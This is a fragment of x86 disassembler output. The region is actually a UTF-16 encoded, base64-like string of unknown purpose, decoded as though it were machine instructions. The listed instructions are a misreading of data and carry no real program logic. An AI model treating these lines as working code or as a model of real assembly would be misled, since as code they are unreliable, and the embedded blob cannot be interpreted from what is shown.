  40a0d0:	73 00                	jae    0x40a0d2
  40a0d2:	73 00                	jae    0x40a0d4
  40a0d4:	67 00 55 00          	add    %dl,0x0(%di)
  40a0d8:	38 00                	cmp    %al,(%eax)
  40a0da:	78 00                	js     0x40a0dc
  40a0dc:	42                   	inc    %edx
  40a0dd:	00 2b                	add    %ch,(%ebx)
  40a0df:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a0e3:	00 69 00             	add    %ch,0x0(%ecx)
  40a0e6:	74 00                	je     0x40a0e8
  40a0e8:	49                   	dec    %ecx
  40a0e9:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40a0ed:	00 2f                	add    %ch,(%edi)
  40a0ef:	00 38                	add    %bh,(%eax)
  40a0f1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0f4:	35 00 2f 00 42       	xor    $0x42002f00,%eax
  40a0f9:	00 30                	add    %dh,(%eax)
  40a0fb:	00 4e 00             	add    %cl,0x0(%esi)
  40a0fe:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a102:	45                   	inc    %ebp
  40a103:	00 78 00             	add    %bh,0x0(%eax)
  40a106:	49                   	dec    %ecx
  40a107:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40a10b:	00 79 00             	add    %bh,0x0(%ecx)
  40a10e:	51                   	push   %ecx
  40a10f:	00 71 00             	add    %dh,0x0(%ecx)
  40a112:	47                   	inc    %edi
  40a113:	00 47 00             	add    %al,0x0(%edi)
  40a116:	46                   	inc    %esi
  40a117:	00 6a 00             	add    %ch,0x0(%edx)
  40a11a:	44                   	inc    %esp
  40a11b:	00 71 00             	add    %dh,0x0(%ecx)
  40a11e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a11f:	00 55 00             	add    %dl,0x0(%ebp)
  40a122:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40a126:	47                   	inc    %edi
  40a127:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40a12b:	00 68 00             	add    %ch,0x0(%eax)
  40a12e:	75 00                	jne    0x40a130
  40a130:	51                   	push   %ecx
  40a131:	00 76 00             	add    %dh,0x0(%esi)
  40a134:	48                   	dec    %eax
  40a135:	00 42 00             	add    %al,0x0(%edx)
  40a138:	34 00                	xor    $0x0,%al
  40a13a:	79 00                	jns    0x40a13c
  40a13c:	42                   	inc    %edx
  40a13d:	00 59 00             	add    %bl,0x0(%ecx)
  40a140:	34 00                	xor    $0x0,%al
  40a142:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a145:	00 43 00             	add    %al,0x0(%ebx)
  40a148:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a14c:	57                   	push   %edi
  40a14d:	00 39                	add    %bh,(%ecx)
  40a14f:	00 49 00             	add    %cl,0x0(%ecx)
  40a152:	52                   	push   %edx
  40a153:	00 68 00             	add    %ch,0x0(%eax)
  40a156:	48                   	dec    %eax
  40a157:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a15a:	63 00                	arpl   %eax,(%eax)
  40a15c:	58                   	pop    %eax
  40a15d:	00 65 00             	add    %ah,0x0(%ebp)
  40a160:	61                   	popa
  40a161:	00 4d 00             	add    %cl,0x0(%ebp)
  40a164:	4e                   	dec    %esi
  40a165:	00 41 00             	add    %al,0x0(%ecx)
  40a168:	33 00                	xor    (%eax),%eax
  40a16a:	43                   	inc    %ebx
  40a16b:	00 53 00             	add    %dl,0x0(%ebx)
  40a16e:	73 00                	jae    0x40a170
  40a170:	73 00                	jae    0x40a172
  40a172:	50                   	push   %eax
  40a173:	00 53 00             	add    %dl,0x0(%ebx)
  40a176:	75 00                	jne    0x40a178
  40a178:	49                   	dec    %ecx
  40a179:	00 42 00             	add    %al,0x0(%edx)
  40a17c:	6a 00                	push   $0x0
  40a17e:	4e                   	dec    %esi
  40a17f:	00 6e 00             	add    %ch,0x0(%esi)
  40a182:	4e                   	dec    %esi
  40a183:	00 75 00             	add    %dh,0x0(%ebp)
  40a186:	50                   	push   %eax
  40a187:	00 48 00             	add    %cl,0x0(%eax)
  40a18a:	73 00                	jae    0x40a18c
  40a18c:	70 00                	jo     0x40a18e
  40a18e:	52                   	push   %edx
  40a18f:	00 38                	add    %bh,(%eax)
  40a191:	00 59 00             	add    %bl,0x0(%ecx)
  40a194:	37                   	aaa
  40a195:	00 56 00             	add    %dl,0x0(%esi)
  40a198:	2f                   	das
  40a199:	00 4e 00             	add    %cl,0x0(%esi)
  40a19c:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40a1a0:	31 00                	xor    %eax,(%eax)
  40a1a2:	53                   	push   %ebx
  40a1a3:	00 45 00             	add    %al,0x0(%ebp)
  40a1a6:	4a                   	dec    %edx
  40a1a7:	00 39                	add    %bh,(%ecx)
  40a1a9:	00 33                	add    %dh,(%ebx)
  40a1ab:	00 55 00             	add    %dl,0x0(%ebp)
  40a1ae:	71 00                	jno    0x40a1b0
  40a1b0:	31 00                	xor    %eax,(%eax)
  40a1b2:	4b                   	dec    %ebx
  40a1b3:	00 32                	add    %dh,(%edx)
  40a1b5:	00 59 00             	add    %bl,0x0(%ecx)
  40a1b8:	70 00                	jo     0x40a1ba
  40a1ba:	48                   	dec    %eax
  40a1bb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a1be:	32 00                	xor    (%eax),%al
  40a1c0:	51                   	push   %ecx
  40a1c1:	00 5a 00             	add    %bl,0x0(%edx)
  40a1c4:	39 00                	cmp    %eax,(%eax)
  40a1c6:	42                   	inc    %edx
  40a1c7:	00 7a 00             	add    %bh,0x0(%edx)
  40a1ca:	69 00 45 00 5a 00    	imul   $0x5a0045,(%eax),%eax
  40a1d0:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40a1d4:	72 00                	jb     0x40a1d6
  40a1d6:	59                   	pop    %ecx
  40a1d7:	00 72 00             	add    %dh,0x0(%edx)
  40a1da:	6b 00 35             	imul   $0x35,(%eax),%eax
  40a1dd:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40a1e1:	00 4f 00             	add    %cl,0x0(%edi)
  40a1e4:	30 00                	xor    %al,(%eax)
  40a1e6:	4c                   	dec    %esp
  40a1e7:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40a1eb:	00 36                	add    %dh,(%esi)
  40a1ed:	00 62 00             	add    %ah,0x0(%edx)
  40a1f0:	74 00                	je     0x40a1f2
  40a1f2:	78 00                	js     0x40a1f4
  40a1f4:	54                   	push   %esp
  40a1f5:	00 47 00             	add    %al,0x0(%edi)
  40a1f8:	54                   	push   %esp
  40a1f9:	00 6f 00             	add    %ch,0x0(%edi)
  40a1fc:	50                   	push   %eax
  40a1fd:	00 53 00             	add    %dl,0x0(%ebx)
  40a200:	42                   	inc    %edx
  40a201:	00 63 00             	add    %ah,0x0(%ebx)
  40a204:	63 00                	arpl   %eax,(%eax)
  40a206:	42                   	inc    %edx
  40a207:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a20b:	00 41 00             	add    %al,0x0(%ecx)
  40a20e:	4a                   	dec    %edx
  40a20f:	00 73 00             	add    %dh,0x0(%ebx)
  40a212:	31 00                	xor    %eax,(%eax)
  40a214:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a218:	6f                   	outsl  %ds:(%esi),(%dx)
  40a219:	00 51 00             	add    %dl,0x0(%ecx)
  40a21c:	31 00                	xor    %eax,(%eax)
  40a21e:	59                   	pop    %ecx
  40a21f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a222:	71 00                	jno    0x40a224
  40a224:	4f                   	dec    %edi
  40a225:	00 39                	add    %bh,(%ecx)
  40a227:	00 51 00             	add    %dl,0x0(%ecx)
  40a22a:	31 00                	xor    %eax,(%eax)
  40a22c:	52                   	push   %edx
  40a22d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a230:	4f                   	dec    %edi
  40a231:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40a235:	00 43 00             	add    %al,0x0(%ebx)
  40a238:	52                   	push   %edx
  40a239:	00 35 00 65 00 76    	add    %dh,0x76006500
  40a23f:	00 53 00             	add    %dl,0x0(%ebx)
  40a242:	50                   	push   %eax
  40a243:	00 49 00             	add    %cl,0x0(%ecx)
  40a246:	51                   	push   %ecx
  40a247:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a24a:	56                   	push   %esi
  40a24b:	00 78 00             	add    %bh,0x0(%eax)
  40a24e:	4d                   	dec    %ebp
  40a24f:	00 36                	add    %dh,(%esi)
  40a251:	00 72 00             	add    %dh,0x0(%edx)
  40a254:	6c                   	insb   (%dx),%es:(%edi)
  40a255:	00 63 00             	add    %ah,0x0(%ebx)
  40a258:	33 00                	xor    (%eax),%eax
  40a25a:	42                   	inc    %edx
  40a25b:	00 6f 00             	add    %ch,0x0(%edi)
  40a25e:	2f                   	das
  40a25f:	00 4e 00             	add    %cl,0x0(%esi)
  40a262:	6f                   	outsl  %ds:(%esi),(%dx)
  40a263:	00 35 00 32 00 72    	add    %dh,0x72003200
  40a269:	00 6d 00             	add    %ch,0x0(%ebp)
  40a26c:	73 00                	jae    0x40a26e
  40a26e:	42                   	inc    %edx
  40a26f:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40a273:	00 67 00             	add    %ah,0x0(%edi)
  40a276:	69 00 52 00 66 00    	imul   $0x660052,(%eax),%eax
  40a27c:	34 00                	xor    $0x0,%al
  40a27e:	6b 00 78             	imul   $0x78,(%eax),%eax
  40a281:	00 77 00             	add    %dh,0x0(%edi)
  40a284:	32 00                	xor    (%eax),%al
  40a286:	6f                   	outsl  %ds:(%esi),(%dx)
  40a287:	00 63 00             	add    %ah,0x0(%ebx)
  40a28a:	44                   	inc    %esp
  40a28b:	00 31                	add    %dh,(%ecx)
  40a28d:	00 33                	add    %dh,(%ebx)
  40a28f:	00 78 00             	add    %bh,0x0(%eax)
  40a292:	6b 00 59             	imul   $0x59,(%eax),%eax
  40a295:	00 79 00             	add    %bh,0x0(%ecx)
  40a298:	56                   	push   %esi
  40a299:	00 71 00             	add    %dh,0x0(%ecx)
  40a29c:	6d                   	insl   (%dx),%es:(%edi)
  40a29d:	00 36                	add    %dh,(%esi)
  40a29f:	00 58 00             	add    %bl,0x0(%eax)
  40a2a2:	54                   	push   %esp
  40a2a3:	00 33                	add    %dh,(%ebx)
  40a2a5:	00 2b                	add    %ch,(%ebx)
  40a2a7:	00 39                	add    %bh,(%ecx)
  40a2a9:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40a2ad:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40a2b1:	00 69 00             	add    %ch,0x0(%ecx)
  40a2b4:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40a2b8:	61                   	popa
  40a2b9:	00 63 00             	add    %ah,0x0(%ebx)
  40a2bc:	59                   	pop    %ecx
  40a2bd:	00 45 00             	add    %al,0x0(%ebp)
  40a2c0:	46                   	inc    %esi
  40a2c1:	00 7a 00             	add    %bh,0x0(%edx)
  40a2c4:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  40a2c8:	4e                   	dec    %esi
  40a2c9:	00 37                	add    %dh,(%edi)
  40a2cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a2ce:	2b 00                	sub    (%eax),%eax
  40a2d0:	79 00                	jns    0x40a2d2
  40a2d2:	61                   	popa
  40a2d3:	00 72 00             	add    %dh,0x0(%edx)
  40a2d6:	4b                   	dec    %ebx
  40a2d7:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40a2db:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40a2df:	00 71 00             	add    %dh,0x0(%ecx)
  40a2e2:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a2e6:	41                   	inc    %ecx
  40a2e7:	00 36                	add    %dh,(%esi)
  40a2e9:	00 49 00             	add    %cl,0x0(%ecx)
  40a2ec:	77 00                	ja     0x40a2ee
  40a2ee:	68 00 6c 00 55       	push   $0x55006c00
  40a2f3:	00 51 00             	add    %dl,0x0(%ecx)
  40a2f6:	7a 00                	jp     0x40a2f8
  40a2f8:	4a                   	dec    %edx
  40a2f9:	00 4f 00             	add    %cl,0x0(%edi)
  40a2fc:	6c                   	insb   (%dx),%es:(%edi)
  40a2fd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a300:	44                   	inc    %esp
  40a301:	00 52 00             	add    %dl,0x0(%edx)
  40a304:	6a 00                	push   $0x0
  40a306:	6f                   	outsl  %ds:(%esi),(%dx)
  40a307:	00 50 00             	add    %dl,0x0(%eax)
  40a30a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a30b:	00 42 00             	add    %al,0x0(%edx)
  40a30e:	77 00                	ja     0x40a310
  40a310:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a314:	68 00 2f 00 44       	push   $0x44002f00
  40a319:	00 59 00             	add    %bl,0x0(%ecx)
  40a31c:	59                   	pop    %ecx
  40a31d:	00 73 00             	add    %dh,0x0(%ebx)
  40a320:	36 00 30             	add    %dh,%ss:(%eax)
  40a323:	00 76 00             	add    %dh,0x0(%esi)
  40a326:	48                   	dec    %eax
  40a327:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a32a:	6d                   	insl   (%dx),%es:(%edi)
  40a32b:	00 37                	add    %dh,(%edi)
  40a32d:	00 49 00             	add    %cl,0x0(%ecx)
  40a330:	49                   	dec    %ecx
  40a331:	00 55 00             	add    %dl,0x0(%ebp)
  40a334:	67 00 35             	add    %dh,(%di)
  40a337:	00 70 00             	add    %dh,0x0(%eax)
  40a33a:	59                   	pop    %ecx
  40a33b:	00 56 00             	add    %dl,0x0(%esi)
  40a33e:	46                   	inc    %esi
  40a33f:	00 70 00             	add    %dh,0x0(%eax)
  40a342:	6d                   	insl   (%dx),%es:(%edi)
  40a343:	00 72 00             	add    %dh,0x0(%edx)
  40a346:	39 00                	cmp    %eax,(%eax)
  40a348:	42                   	inc    %edx
  40a349:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40a34d:	00 2f                	add    %ch,(%edi)
  40a34f:	00 62 00             	add    %ah,0x0(%edx)
  40a352:	4a                   	dec    %edx
  40a353:	00 4a 00             	add    %cl,0x0(%edx)
  40a356:	4f                   	dec    %edi
  40a357:	00 76 00             	add    %dh,0x0(%esi)
  40a35a:	57                   	push   %edi
  40a35b:	00 48 00             	add    %cl,0x0(%eax)
  40a35e:	37                   	aaa
  40a35f:	00 69 00             	add    %ch,0x0(%ecx)
  40a362:	57                   	push   %edi
  40a363:	00 4a 00             	add    %cl,0x0(%edx)
  40a366:	69 00 51 00 6d 00    	imul   $0x6d0051,(%eax),%eax
  40a36c:	75 00                	jne    0x40a36e
  40a36e:	71 00                	jno    0x40a370
  40a370:	70 00                	jo     0x40a372
  40a372:	6c                   	insb   (%dx),%es:(%edi)
  40a373:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40a377:	00 39                	add    %bh,(%ecx)
  40a379:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40a37d:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40a381:	00 48 00             	add    %cl,0x0(%eax)
  40a384:	38 00                	cmp    %al,(%eax)
  40a386:	44                   	inc    %esp
  40a387:	00 75 00             	add    %dh,0x0(%ebp)
  40a38a:	63 00                	arpl   %eax,(%eax)
  40a38c:	58                   	pop    %eax
  40a38d:	00 4e 00             	add    %cl,0x0(%esi)
  40a390:	34 00                	xor    $0x0,%al
  40a392:	32 00                	xor    (%eax),%al
  40a394:	59                   	pop    %ecx
  40a395:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a399:	00 55 00             	add    %dl,0x0(%ebp)
  40a39c:	48                   	dec    %eax
  40a39d:	00 2f                	add    %ch,(%edi)
  40a39f:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a3a3:	00 53 00             	add    %dl,0x0(%ebx)
  40a3a6:	71 00                	jno    0x40a3a8
  40a3a8:	36 00 31             	add    %dh,%ss:(%ecx)
  40a3ab:	00 46 00             	add    %al,0x0(%esi)
  40a3ae:	4e                   	dec    %esi
  40a3af:	00 33                	add    %dh,(%ebx)
  40a3b1:	00 50 00             	add    %dl,0x0(%eax)
  40a3b4:	75 00                	jne    0x40a3b6
  40a3b6:	46                   	inc    %esi
  40a3b7:	00 50 00             	add    %dl,0x0(%eax)
  40a3ba:	38 00                	cmp    %al,(%eax)
  40a3bc:	47                   	inc    %edi
  40a3bd:	00 62 00             	add    %ah,0x0(%edx)
  40a3c0:	4e                   	dec    %esi
  40a3c1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3c4:	62 00                	bound  %eax,(%eax)
  40a3c6:	68 00 57 00 31       	push   $0x31005700
  40a3cb:	00 55 00             	add    %dl,0x0(%ebp)
  40a3ce:	55                   	push   %ebp
  40a3cf:	00 2b                	add    %ch,(%ebx)
  40a3d1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3d4:	76 00                	jbe    0x40a3d6
  40a3d6:	4f                   	dec    %edi
  40a3d7:	00 47 00             	add    %al,0x0(%edi)
  40a3da:	31 00                	xor    %eax,(%eax)
  40a3dc:	30 00                	xor    %al,(%eax)
  40a3de:	63 00                	arpl   %eax,(%eax)
  40a3e0:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40a3e4:	68 00 2f 00 49       	push   $0x49002f00
  40a3e9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3ec:	79 00                	jns    0x40a3ee
  40a3ee:	59                   	pop    %ecx
  40a3ef:	00 6e 00             	add    %ch,0x0(%esi)
  40a3f2:	59                   	pop    %ecx
  40a3f3:	00 31                	add    %dh,(%ecx)
  40a3f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a3f8:	39 00                	cmp    %eax,(%eax)
  40a3fa:	45                   	inc    %ebp
  40a3fb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3fe:	30 00                	xor    %al,(%eax)
  40a400:	71 00                	jno    0x40a402
  40a402:	5a                   	pop    %edx
  40a403:	00 57 00             	add    %dl,0x0(%edi)
  40a406:	33 00                	xor    (%eax),%eax
  40a408:	2f                   	das
  40a409:	00 79 00             	add    %bh,0x0(%ecx)
  40a40c:	77 00                	ja     0x40a40e
  40a40e:	4b                   	dec    %ebx
  40a40f:	00 61 00             	add    %ah,0x0(%ecx)
  40a412:	43                   	inc    %ebx
  40a413:	00 73 00             	add    %dh,0x0(%ebx)
  40a416:	47                   	inc    %edi
  40a417:	00 50 00             	add    %dl,0x0(%eax)
  40a41a:	67 00 36 00 31       	add    %dh,0x3100
  40a41f:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40a423:	00 4f 00             	add    %cl,0x0(%edi)
  40a426:	56                   	push   %esi
  40a427:	00 4a 00             	add    %cl,0x0(%edx)
  40a42a:	79 00                	jns    0x40a42c
  40a42c:	41                   	inc    %ecx
  40a42d:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40a431:	00 6b 00             	add    %ch,0x0(%ebx)
  40a434:	6d                   	insl   (%dx),%es:(%edi)
  40a435:	00 4e 00             	add    %cl,0x0(%esi)
  40a438:	38 00                	cmp    %al,(%eax)
  40a43a:	51                   	push   %ecx
  40a43b:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40a43f:	00 4e 00             	add    %cl,0x0(%esi)
  40a442:	4d                   	dec    %ebp
  40a443:	00 53 00             	add    %dl,0x0(%ebx)
  40a446:	78 00                	js     0x40a448
  40a448:	51                   	push   %ecx
  40a449:	00 51 00             	add    %dl,0x0(%ecx)
  40a44c:	54                   	push   %esp
  40a44d:	00 73 00             	add    %dh,0x0(%ebx)
  40a450:	61                   	popa
  40a451:	00 77 00             	add    %dh,0x0(%edi)
  40a454:	2f                   	das
  40a455:	00 43 00             	add    %al,0x0(%ebx)
  40a458:	50                   	push   %eax
  40a459:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40a45d:	00 55 00             	add    %dl,0x0(%ebp)
  40a460:	54                   	push   %esp
  40a461:	00 46 00             	add    %al,0x0(%esi)
  40a464:	63 00                	arpl   %eax,(%eax)
  40a466:	32 00                	xor    (%eax),%al
  40a468:	32 00                	xor    (%eax),%al
  40a46a:	6a 00                	push   $0x0
  40a46c:	6a 00                	push   $0x0
  40a46e:	77 00                	ja     0x40a470
  40a470:	76 00                	jbe    0x40a472
  40a472:	6f                   	outsl  %ds:(%esi),(%dx)
  40a473:	00 4e 00             	add    %cl,0x0(%esi)
  40a476:	79 00                	jns    0x40a478
  40a478:	41                   	inc    %ecx
  40a479:	00 6d 00             	add    %ch,0x0(%ebp)
  40a47c:	76 00                	jbe    0x40a47e
  40a47e:	4d                   	dec    %ebp
  40a47f:	00 5a 00             	add    %bl,0x0(%edx)
  40a482:	58                   	pop    %eax
  40a483:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40a487:	00 67 00             	add    %ah,0x0(%edi)
  40a48a:	76 00                	jbe    0x40a48c
  40a48c:	56                   	push   %esi
  40a48d:	00 62 00             	add    %ah,0x0(%edx)
  40a490:	76 00                	jbe    0x40a492
  40a492:	52                   	push   %edx
  40a493:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40a497:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40a49b:	00 4e 00             	add    %cl,0x0(%esi)
  40a49e:	79 00                	jns    0x40a4a0
  40a4a0:	50                   	push   %eax
  40a4a1:	00 57 00             	add    %dl,0x0(%edi)
  40a4a4:	70 00                	jo     0x40a4a6
  40a4a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4a7:	00 62 00             	add    %ah,0x0(%edx)
  40a4aa:	77 00                	ja     0x40a4ac
  40a4ac:	6c                   	insb   (%dx),%es:(%edi)
  40a4ad:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40a4b1:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a4b5:	00 75 00             	add    %dh,0x0(%ebp)
  40a4b8:	4c                   	dec    %esp
  40a4b9:	00 52 00             	add    %dl,0x0(%edx)
  40a4bc:	39 00                	cmp    %eax,(%eax)
  40a4be:	45                   	inc    %ebp
  40a4bf:	00 39                	add    %bh,(%ecx)
  40a4c1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4c4:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a4c7:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40a4cb:	00 4e 00             	add    %cl,0x0(%esi)
  40a4ce:	75 00                	jne    0x40a4d0
  40a4d0:	31 00                	xor    %eax,(%eax)
  40a4d2:	61                   	popa
  40a4d3:	00 39                	add    %bh,(%ecx)
  40a4d5:	00 58 00             	add    %bl,0x0(%eax)
  40a4d8:	72 00                	jb     0x40a4da
  40a4da:	73 00                	jae    0x40a4dc
  40a4dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4dd:	00 49 00             	add    %cl,0x0(%ecx)
  40a4e0:	78 00                	js     0x40a4e2
  40a4e2:	50                   	push   %eax
  40a4e3:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40a4e7:	00 45 00             	add    %al,0x0(%ebp)
  40a4ea:	6d                   	insl   (%dx),%es:(%edi)
  40a4eb:	00 4f 00             	add    %cl,0x0(%edi)
  40a4ee:	4f                   	dec    %edi
  40a4ef:	00 2f                	add    %ch,(%edi)
  40a4f1:	00 78 00             	add    %bh,0x0(%eax)
  40a4f4:	31 00                	xor    %eax,(%eax)
  40a4f6:	77 00                	ja     0x40a4f8
  40a4f8:	77 00                	ja     0x40a4fa
  40a4fa:	4c                   	dec    %esp
  40a4fb:	00 66 00             	add    %ah,0x0(%esi)
  40a4fe:	49                   	dec    %ecx
  40a4ff:	00 65 00             	add    %ah,0x0(%ebp)
  40a502:	59                   	pop    %ecx
  40a503:	00 67 00             	add    %ah,0x0(%edi)
  40a506:	48                   	dec    %eax
  40a507:	00 48 00             	add    %cl,0x0(%eax)
  40a50a:	43                   	inc    %ebx
  40a50b:	00 35 00 33 00 33    	add    %dh,0x33003300
  40a511:	00 46 00             	add    %al,0x0(%esi)
  40a514:	54                   	push   %esp
  40a515:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  40a519:	00 78 00             	add    %bh,0x0(%eax)
  40a51c:	32 00                	xor    (%eax),%al
  40a51e:	74 00                	je     0x40a520
  40a520:	61                   	popa
  40a521:	00 33                	add    %dh,(%ebx)
  40a523:	00 6e 00             	add    %ch,0x0(%esi)
  40a526:	68 00 2b 00 6a       	push   $0x6a002b00
  40a52b:	00 45 00             	add    %al,0x0(%ebp)
  40a52e:	7a 00                	jp     0x40a530
  40a530:	6b 00 58             	imul   $0x58,(%eax),%eax
  40a533:	00 6b 00             	add    %ch,0x0(%ebx)
  40a536:	78 00                	js     0x40a538
  40a538:	6f                   	outsl  %ds:(%esi),(%dx)
  40a539:	00 7a 00             	add    %bh,0x0(%edx)
  40a53c:	39 00                	cmp    %eax,(%eax)
  40a53e:	79 00                	jns    0x40a540
  40a540:	4a                   	dec    %edx
  40a541:	00 62 00             	add    %ah,0x0(%edx)
  40a544:	55                   	push   %ebp
  40a545:	00 66 00             	add    %ah,0x0(%esi)
  40a548:	35 00 75 00 39       	xor    $0x39007500,%eax
  40a54d:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  40a551:	00 4d 00             	add    %cl,0x0(%ebp)
  40a554:	39 00                	cmp    %eax,(%eax)
  40a556:	56                   	push   %esi
  40a557:	00 55 00             	add    %dl,0x0(%ebp)
  40a55a:	36 00 30             	add    %dh,%ss:(%eax)
  40a55d:	00 36                	add    %dh,(%esi)
  40a55f:	00 56 00             	add    %dl,0x0(%esi)
  40a562:	4c                   	dec    %esp
  40a563:	00 61 00             	add    %ah,0x0(%ecx)
  40a566:	5a                   	pop    %edx
  40a567:	00 38                	add    %bh,(%eax)
  40a569:	00 68 00             	add    %ch,0x0(%eax)
  40a56c:	2b 00                	sub    (%eax),%eax
  40a56e:	35 00 53 00 31       	xor    $0x31005300,%eax
  40a573:	00 55 00             	add    %dl,0x0(%ebp)
  40a576:	4e                   	dec    %esi
  40a577:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40a57b:	00 71 00             	add    %dh,0x0(%ecx)
  40a57e:	66 00 47 00          	data16 add %al,0x0(%edi)
  40a582:	61                   	popa
  40a583:	00 73 00             	add    %dh,0x0(%ebx)
  40a586:	32 00                	xor    (%eax),%al
  40a588:	51                   	push   %ecx
  40a589:	00 51 00             	add    %dl,0x0(%ecx)
  40a58c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a590:	6f                   	outsl  %ds:(%esi),(%dx)
  40a591:	00 53 00             	add    %dl,0x0(%ebx)
  40a594:	6c                   	insb   (%dx),%es:(%edi)
  40a595:	00 6e 00             	add    %ch,0x0(%esi)
  40a598:	55                   	push   %ebp
  40a599:	00 2b                	add    %ch,(%ebx)
  40a59b:	00 4e 00             	add    %cl,0x0(%esi)
  40a59e:	78 00                	js     0x40a5a0
  40a5a0:	56                   	push   %esi
  40a5a1:	00 70 00             	add    %dh,0x0(%eax)
  40a5a4:	31 00                	xor    %eax,(%eax)
  40a5a6:	75 00                	jne    0x40a5a8
  40a5a8:	56                   	push   %esi
  40a5a9:	00 66 00             	add    %ah,0x0(%esi)
  40a5ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5ad:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a5b1:	00 65 00             	add    %ah,0x0(%ebp)
  40a5b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5b5:	00 30                	add    %dh,(%eax)
  40a5b7:	00 48 00             	add    %cl,0x0(%eax)
  40a5ba:	2f                   	das
  40a5bb:	00 75 00             	add    %dh,0x0(%ebp)
  40a5be:	33 00                	xor    (%eax),%eax
  40a5c0:	4a                   	dec    %edx
  40a5c1:	00 30                	add    %dh,(%eax)
  40a5c3:	00 39                	add    %bh,(%ecx)
  40a5c5:	00 58 00             	add    %bl,0x0(%eax)
  40a5c8:	49                   	dec    %ecx
  40a5c9:	00 63 00             	add    %ah,0x0(%ebx)
  40a5cc:	34 00                	xor    $0x0,%al
  40a5ce:	42                   	inc    %edx
  40a5cf:	00 55 00             	add    %dl,0x0(%ebp)
  40a5d2:	36 00 44 00 5a       	add    %al,%ss:0x5a(%eax,%eax,1)
  40a5d7:	00 79 00             	add    %bh,0x0(%ecx)
  40a5da:	49                   	dec    %ecx
  40a5db:	00 72 00             	add    %dh,0x0(%edx)
  40a5de:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a5e1:	00 4a 00             	add    %cl,0x0(%edx)
  40a5e4:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40a5e8:	44                   	inc    %esp
  40a5e9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5ec:	63 00                	arpl   %eax,(%eax)
  40a5ee:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40a5f2:	76 00                	jbe    0x40a5f4
  40a5f4:	59                   	pop    %ecx
  40a5f5:	00 71 00             	add    %dh,0x0(%ecx)
  40a5f8:	4f                   	dec    %edi
  40a5f9:	00 58 00             	add    %bl,0x0(%eax)
  40a5fc:	70 00                	jo     0x40a5fe
  40a5fe:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40a602:	6b 00 46             	imul   $0x46,(%eax),%eax
  40a605:	00 76 00             	add    %dh,0x0(%esi)
  40a608:	31 00                	xor    %eax,(%eax)
  40a60a:	79 00                	jns    0x40a60c
  40a60c:	30 00                	xor    %al,(%eax)
  40a60e:	49                   	dec    %ecx
